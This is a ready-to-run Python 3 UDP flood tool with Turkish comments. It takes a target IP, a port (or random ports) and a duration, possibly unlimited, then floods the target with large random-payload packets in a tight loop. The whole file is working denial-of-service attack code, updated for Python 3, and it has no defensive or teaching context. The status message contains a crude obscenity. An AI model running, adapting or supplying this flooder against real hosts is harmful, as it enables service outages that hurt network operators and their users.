#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UDP Flood – Python 3 uyumlu, time.clock hatası düzeltildi, hata yönetimi eklendi.

import socket
import random
import sys
import time

if len(sys.argv) < 4:
    sys.exit('Usage: udp.py ip port(0=random) length(0=forever)')

def UDPFlood():
    try:
        port = int(sys.argv[2])
    except ValueError:
        sys.exit('Port sayı olmalı.')

    randport = (port == 0)  # True ise rastgele port kullan
    ip = sys.argv[1]

    try:
        dur = int(sys.argv[3])
    except ValueError:
        sys.exit('Süre sayı olmalı.')

    # time.clock yerine time.perf_counter (Python 3.3+)
    if dur > 0:
        start = time.perf_counter()
        bitis = start + dur
        def zaman_kontrol():
            return time.perf_counter() < bitis
    else:
        def zaman_kontrol():
            return True

    print(f'Jebanje majke: {ip}:{port} for {dur if dur > 0 else "infinite"} seconds')
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**27)
    packet = random._urandom(15000)

    sent = 0
    try:
        while zaman_kontrol():
            gonder_port = random.randint(1, 65535) if randport else port
            sock.sendto(packet, (ip, gonder_port))
            sent += 1
            # Her 1000 pakette bir ekrana yaz (opsiyonel, performans için kaldırılabilir)
            if sent % 5000 == 0:
                print(f'\r[*] Gönderilen paket: {sent}', end='')
    except KeyboardInterrupt:
        print(f'\n[!] Kullanıcı durdurdu. Toplam: {sent}')
    except Exception as e:
        print(f'\n[!] Hata: {e}')
    finally:
        sock.close()
        print(f'\n[*] İşlem bitti. Toplam paket: {sent}')

UDPFlood()